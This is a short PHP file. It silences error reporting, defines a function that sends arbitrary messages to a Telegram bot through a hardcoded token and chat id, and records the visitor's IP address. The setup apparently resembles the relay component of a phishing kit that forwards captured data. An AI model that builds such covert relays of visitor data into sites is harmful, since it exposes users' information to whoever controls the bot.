<?php
	error_reporting(0);

function yolla($mesaj){
  $apiToken = "382022228:AAHZnewtR3-_IYSDQRCWBVfaeceVKZ_22222";
  $data = [
      'chat_id' => '9999999',
      'text' => $mesaj
  ];
  $response = file_get_contents("https://api.telegram.org/bot$apiToken/sendMessage?" .
                                 http_build_query($data) );
  return $response;
}

$ip = $_SERVER['REMOTE_ADDR'];
?>